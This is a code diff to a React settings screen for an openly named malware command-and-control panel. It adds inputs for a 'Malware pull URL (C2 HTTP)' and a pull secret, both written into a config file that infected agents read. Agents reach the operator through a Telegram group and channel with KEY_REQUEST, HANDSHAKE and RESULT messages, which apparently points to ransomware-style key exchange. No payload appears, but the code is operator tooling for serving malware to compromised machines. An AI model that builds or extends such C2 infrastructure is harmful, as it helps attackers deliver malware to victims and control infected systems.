@@ -20,6 +20,8 @@ function ActiveBotCard({
   chatIds,
   c2GroupId,
   c2ChannelId,
+  malwarePullBaseUrl,
+  hasMalwarePullSecret,
   onDelete,
   deleting,
 }: {
@@ -27,6 +29,8 @@ function ActiveBotCard({
   chatIds: string[];
   c2GroupId?: string;
   c2ChannelId?: string;
+  malwarePullBaseUrl?: string;
+  hasMalwarePullSecret?: boolean;
   onDelete: () => void;
   deleting: boolean;
 }) {
@@ -49,6 +53,15 @@ function ActiveBotCard({
             : 'No chat IDs configured'}
         </p>
         <p className="text-[11px] text-c2-muted/80 mt-1.5 font-mono break-all leading-relaxed">
+          <span className="text-c2-muted">Malware HTTP pull:</span>{' '}
+          {malwarePullBaseUrl ? malwarePullBaseUrl : '—'}
+          {hasMalwarePullSecret ? (
+            <span className="text-emerald-400/90"> · pull secret set</span>
+          ) : (
+            <span className="text-c2-muted/60"> · default secret</span>
+          )}
+        </p>
+        <p className="text-[11px] text-c2-muted/80 mt-1 font-mono break-all leading-relaxed">
           <span className="text-c2-muted">Malware group:</span> {c2GroupId ?? '—'}{' '}
           <span className="text-c2-muted">· channel:</span> {c2ChannelId ?? '—'}
         </p>
@@ -81,6 +94,9 @@ export function TelegramSettings() {
   const [chatIds, setChatIds] = useState('');
   const [c2GroupId, setC2GroupId] = useState('');
   const [c2ChannelId, setC2ChannelId] = useState('');
+  const [c2ServerUrl, setC2ServerUrl] = useState('');
+  const [malwarePullSecret, setMalwarePullSecret] = useState('');
+  const [c2ServerUrlAuto, setC2ServerUrlAuto] = useState(false);
   const [savingConfig, setSavingConfig] = useState(false);
   const [deletingConfig, setDeletingConfig] = useState(false);
   const [showAddForm, setShowAddForm] = useState(false);
@@ -107,6 +123,11 @@ export function TelegramSettings() {
   const [testSending, setTestSending] = useState(false);
 
   useEffect(() => {
+    if (!botConfig) return;
+    setC2ServerUrl(botConfig.c2_server_url ?? '');
+  }, [botConfig]);
+
+  useEffect(() => {
     if (!showAddForm || !botConfig) return;
     setC2GroupId(botConfig.c2_group_id ?? '');
     setC2ChannelId(botConfig.c2_channel_id ?? '');
@@ -114,7 +135,15 @@ export function TelegramSettings() {
 
   /* handlers ── config ── */
   const handleSaveConfig = async () => {
-    if (!token.trim() && !chatIds.trim() && !c2GroupId.trim() && !c2ChannelId.trim()) {
+    const hasAny =
+      token.trim() ||
+      chatIds.trim() ||
+      c2GroupId.trim() ||
+      c2ChannelId.trim() ||
+      c2ServerUrl.trim() ||
+      malwarePullSecret.trim() ||
+      c2ServerUrlAuto;
+    if (!hasAny) {
       toast.warning('Please fill in at least one field', 'Validation');
       return;
     }
@@ -127,12 +156,17 @@ export function TelegramSettings() {
       }
       if (c2GroupId.trim()) payload.c2_group_id = c2GroupId.trim();
       if (c2ChannelId.trim()) payload.c2_channel_id = c2ChannelId.trim();
+      if (c2ServerUrl.trim()) payload.c2_server_url = c2ServerUrl.trim();
+      if (malwarePullSecret.trim()) payload.malware_pull_secret = malwarePullSecret.trim();
+      if (c2ServerUrlAuto) payload.c2_server_url_auto = true;
       await api.updateTelegramSettings(payload);
       toast.success('Bot configuration saved successfully', 'Saved ✓');
       setToken('');
       setChatIds('');
       setC2GroupId('');
       setC2ChannelId('');
+      setMalwarePullSecret('');
+      setC2ServerUrlAuto(false);
       setShowAddForm(false);
       await refreshConfig();
     } catch (err: unknown) {
@@ -324,6 +358,8 @@ export function TelegramSettings() {
             chatIds={botConfig.chat_ids}
             c2GroupId={botConfig.c2_group_id}
             c2ChannelId={botConfig.c2_channel_id}
+            malwarePullBaseUrl={botConfig.c2_server_url}
+            hasMalwarePullSecret={botConfig.has_malware_pull_secret}
             onDelete={handleDeleteConfig}
             deleting={deletingConfig}
           />
@@ -404,6 +440,46 @@ export function TelegramSettings() {
                     Channel where agents send KEY_REQUEST, HANDSHAKE, RESULT (bot must be admin)
                   </p>
                 </div>
+                {/* Malware HTTP pull — written into telegram_config.json for agents */}
+                <div>
+                  <label className="text-xs text-c2-muted mb-2 block font-medium uppercase tracking-wider flex items-center gap-1.5">
+                    <Zap size={11} /> Malware pull URL (C2 HTTP)
+                  </label>
+                  <input
+                    type="text"
+                    value={c2ServerUrl}
+                    onChange={e => setC2ServerUrl(e.target.value)}
+                    placeholder="http://192.168.1.10:5000"
+                    className="c2-input font-mono text-sm placeholder:text-c2-muted/40"
+                  />
+                  <p className="text-xs text-c2-muted/60 mt-1.5">
+                    Agents read this from <span className="font-mono text-c2-muted">telegram_config.json</span> — same LAN as this server is typical.
+                  </p>
+                  <label className="mt-2 flex items-start gap-2 text-xs text-c2-muted cursor-pointer select-none">
+                    <input
+                      type="checkbox"
+                      className="mt-0.5 rounded border-white/20"
+                      checked={c2ServerUrlAuto}
+                      onChange={e => setC2ServerUrlAuto(e.target.checked)}
+                    />
+                    <span>On save, detect this machine&apos;s LAN IP and set pull URL to <span className="font-mono text-c2-muted/90">http://{'<LAN>'}:5000</span></span>
+                  </label>
+                </div>
+                <div>
+                  <label className="text-xs text-c2-muted mb-2 block font-medium uppercase tracking-wider flex items-center gap-1.5">
+                    <ShieldCheck size={11} /> Malware pull secret (optional)
+                  </label>
+                  <input
+                    type="password"
+                    value={malwarePullSecret}
+                    onChange={e => setMalwarePullSecret(e.target.value)}
+                    placeholder="Leave empty to keep current / default"
+                    className="c2-input font-mono text-xs placeholder:text-c2-muted/40"
+                  />
+                  <p className="text-xs text-c2-muted/60 mt-1.5">
+                    Must match <span className="font-mono">MALWARE_PULL_SECRET</span> on the C2 server. Saved into config file for agents.
+                  </p>
+                </div>
                 {/* Buttons */}
                 <div className="flex gap-2">
                   <motion.button
@@ -419,7 +495,13 @@ export function TelegramSettings() {
                   </motion.button>
                   <motion.button
                     whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }}
-                    onClick={() => { setShowAddForm(false); setToken(''); setChatIds(''); }}
+                    onClick={() => {
+                      setShowAddForm(false);
+                      setToken('');
+                      setChatIds('');
+                      setMalwarePullSecret('');
+                      setC2ServerUrlAuto(false);
+                    }}
                     className={cn(
                       'flex items-center gap-1.5 px-4 py-2 rounded-xl text-sm font-medium',
                       'bg-white/[0.04] border border-white/[0.08] text-c2-muted hover:text-white',
